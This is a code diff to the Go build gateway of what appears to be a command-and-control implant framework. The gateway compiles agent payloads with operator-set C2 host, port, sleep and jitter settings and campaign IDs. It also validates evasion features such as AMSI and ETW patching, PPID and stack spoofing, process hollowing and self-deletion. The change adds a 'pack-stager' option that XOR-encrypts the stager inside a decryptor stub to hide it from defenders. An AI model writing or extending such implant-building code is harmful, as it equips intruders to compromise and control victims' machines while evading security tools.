@@ -230,7 +230,7 @@ func (g *gateway) runBuild(buildID, campaignID, c2Host, c2Port,
 			"etw-patch": true, "amsi-patch": true, "ppid-spoof": true,
 			"heap-encrypt": true, "stack-spoof": true, "udrl": true, "staged-payload": true,
 			"self-delete": true, "channel-tcp": true, "channel-smb": true,
-			"sleep-encrypt": true, "process-hollow": true,
+			"sleep-encrypt": true, "process-hollow": true, "pack-stager": true,
 		}
 		var validated []string
 		for _, f := range features {
@@ -269,7 +269,7 @@ func (g *gateway) runBuild(buildID, campaignID, c2Host, c2Port,
 		// DM_BIN must match the cargo output so the Dockerfile cp succeeds.
 		payloadArgs := makeAgentBuildArgs(payloadImageTag, cargoTarget, binName, c2Host, c2Port,
 			regPath, pollPath, sleepSecs, jitterPct, buildID, tlsSkipVerifyStr, userAgent,
-			sleepEncryptStr, payloadFeatures, campaignID)
+			sleepEncryptStr, payloadFeatures, campaignID, false)
 
 		payloadCmd := exec.CommandContext(ctx, "docker", payloadArgs...)
 		payloadCmd.Env = append(os.Environ(), "DOCKER_BUILDKIT=1")
@@ -304,6 +304,14 @@ func (g *gateway) runBuild(buildID, campaignID, c2Host, c2Port,
 		g.log.Info("payload companion ready", zap.String("build_id", buildID), zap.String("key", buildID+"-payload"+ext))
 	}
 
+	// When pack-stager is requested the stager is XOR-encrypted and wrapped in a
+	// tiny decryptor stub (dm-stub.exe).  The artifact delivered to the operator
+	// is dm-stub.exe; the raw stager never leaves the build container.
+	packStager := strings.Contains(featuresArg, "pack-stager")
+	// Remove pack-stager from the feature list passed to Cargo — it is a build-pipeline
+	// directive, not a Cargo feature.
+	featuresArg = removeFeature(featuresArg, "pack-stager")
+
 	// For staged-payload builds use a minimal stager feature set so evasion code
 	// (etw-patch, amsi-patch, etc.) doesn't appear in the stager binary's .text.
 	stagerFeatures := featuresArg
@@ -313,7 +321,7 @@ func (g *gateway) runBuild(buildID, campaignID, c2Host, c2Port,
 
 	buildArgs := makeAgentBuildArgs(imageTag, cargoTarget, binName, c2Host, c2Port,
 		regPath, pollPath, sleepSecs, jitterPct, buildID, tlsSkipVerifyStr, userAgent,
-		sleepEncryptStr, stagerFeatures, campaignID)
+		sleepEncryptStr, stagerFeatures, campaignID, packStager)
 
 	buildCmd := exec.CommandContext(ctx, "docker", buildArgs...)
 	buildCmd.Env = append(os.Environ(), "DOCKER_BUILDKIT=1")
@@ -325,11 +333,18 @@ func (g *gateway) runBuild(buildID, campaignID, c2Host, c2Port,
 		return
 	}
 
+	// When packing, the operator artifact is dm-stub.exe; dm-agent.exe is the raw
+	// stager embedded inside the stub and is discarded after the build.
+	extractBin := binName
+	if packStager {
+		extractBin = "dm-stub" + ext
+	}
+
 	outPath := "/artifacts/" + buildID + ext
 	extractCmd := exec.CommandContext(ctx,
 		"docker", "run", "--rm",
 		"-v", buildVolume+":/out",
-		imageTag, "sh", "-c", "cp /"+binName+" /out/"+buildID+ext,
+		imageTag, "sh", "-c", "cp /"+extractBin+" /out/"+buildID+ext,
 	)
 	if err := extractCmd.Run(); err != nil {
 		g.log.Error("docker extract failed", zap.String("build_id", buildID), zap.Error(err))
@@ -359,7 +374,13 @@ func (g *gateway) runBuild(buildID, campaignID, c2Host, c2Port,
 
 func makeAgentBuildArgs(imageTag, cargoTarget, binName, c2Host, c2Port,
 	regPath, pollPath string, sleepSecs, jitterPct int,
-	buildID, tlsSkipVerify, userAgent, sleepEncrypt, features, campaignID string) []string {
+	buildID, tlsSkipVerify, userAgent, sleepEncrypt, features, campaignID string,
+	packStager bool) []string {
+
+	packStr := "false"
+	if packStager {
+		packStr = "true"
+	}
 
 	args := []string{
 		"build",
@@ -378,6 +399,7 @@ func makeAgentBuildArgs(imageTag, cargoTarget, binName, c2Host, c2Port,
 		"--build-arg", "DM_UA=" + userAgent,
 		"--build-arg", "DM_SLEEP_ENCRYPT=" + sleepEncrypt,
 		"--build-arg", "DM_FEATURES=" + features,
+		"--build-arg", "DM_PACK_STAGER=" + packStr,
 	}
 	if campaignID != "" && campaignID != "00000000-0000-0000-0000-000000000000" {
 		args = append(args, "--build-arg", "DM_CAMPAIGN_ID="+campaignID)
